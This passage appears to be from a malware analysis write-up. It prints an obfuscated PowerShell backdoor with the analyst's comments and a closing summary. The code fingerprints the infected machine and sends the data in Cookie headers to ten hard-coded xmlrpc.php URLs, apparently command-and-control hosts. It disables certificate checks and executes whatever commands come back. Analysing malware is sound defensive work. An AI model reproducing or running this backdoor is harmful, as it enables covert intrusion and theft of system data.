 [SYsTeM.conVErt]::tObase64StRING($lTmgeQ.ToaRrAy())
 }
 
 #This will be used last cookie to determine type of each object in user's desktop
 $FNZMSGn = ("ISfOLDer|shelL.ApplIcatIOn|nameSPACE|ITeMs|ISlInk|nAme|IsfILESySTEM").split("|");
 
 #Commands are executed using powershell and the results are gzipped+base64 encoded before saving into 
variables
 $PxTkx=EamsVW((dir env:|where{$_.value.Length -lt 99}|%{($_.name+"^"+$_.value)})+("OSWMI^"+(gwmi 
Win32_OperatingSystem).caption));
 $vYYeqyY=EamsVW(GpS|SELEct nAme -UNIQuE|%{$_.NAME});
 $RAAqcyUu=EamsVW(gPs|WheRe{$_.MainWInDOWtITlE}|%{$_.name+"^"+$_.mAinWinDoWTItlE});
 $VfGPa=EamsVW(((new-object -com ($FNZMSGn[1])).($FNZMSGn[2])(0)).($FNZMSGn[3])()|%{if($_.($FNZMSGn[4]))
{"0"+$_.($FNZMSGn[5])}elseif($_.($FNZMSGn[0])){"1"+$_.($FNZMSGn[5])}elseif($_.($FNZMSGn[6])){"2"+[iO.path]::
GETFILEnAmE($_.paTh)}ElsE{"3"+$_.($FNZMSGn[5])}});
 $bVlCC=EamsVW(gDR|WhERe{$_.FREE -gT 50000}|%{$_.naMe+"^"+$_.uSeD});
 
 #Sets up HTTPS request to one of the URL listed below
 [NeT.serVIcepoINTMaNAgER]::SecuRiTYPROTocoL = [NeT.securITyProTOCOlType]::tLS12;[NEt.
SeRViCEpOINTmanageR]::sERvercErtIFICateVAlIDaTiONCalLbAck ={$TRUE};
 $MUxGbh=[systEM.NeT.weBrEQUeST]::CREaTe($xrxnR);
 $MUxGbh.USeRAgeNt="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/107.0.0.0 Safari/537.36";
 $MUxGbh.kEEPAlIVe=0;
 
 #Cookies are added here
 $MUxGbh.HEadeRS.AdD("Cookie: $fIZSmsu=$PxTkx; $fIZSmsu`1=$vYYeqyY; $fIZSmsu`2=$RAAqcyUu; 
$fIZSmsu`3=$VfGPa; $fIZSmsu`4=$bVlCC");
 
 #Performs the request and saves response into variable
 $SMJqM=neW-oBject SyStem.IO.STrEAmreAdEr $MUxGbh.geTreSPonSe().geTReSpoNseSTReAm();
 
 #Performs checks on response and executes further powershell commands received 
 $HSqFL=($SMJqM.REadtoend()) -SplIT $fIZSmsu;If($HSqFL.cOunT -eQ 3){Iex($HSqFL[1] -rEPLACe "^","");}
}
WHiLe(1){
 trY{
 YWSlHGm(@("https://caperacking.co.za/xmlrpc.php","https://colorlib.com/xmlrpc.php","
https://virtualtilt.com/xmlrpc.php","https://bepmina.vn/xmlrpc.php","https://sexmoviesfoundonline.com/xmlrpc.
php","https://oceanprezentow.pl/xmlrpc.php","https://laminaintuasturias.es/xmlrpc.php","https://zeltoday.ru
/xmlrpc.php","https://activ.co.id/xmlrpc.php","https://thewarzonehacker.com/xmlrpc.php") | get-randOM)
 }CatCH{};
 SLEEp -s 20
 }
```

To summarise the functionality of the script above:
1. One of the URLs is randomly selected
2. A cookie header is populated with compressed encoded fingerprint data of the infected machine
3. A HTTPS request with the cookie header is made to the URL
4. Response is used to execute shell code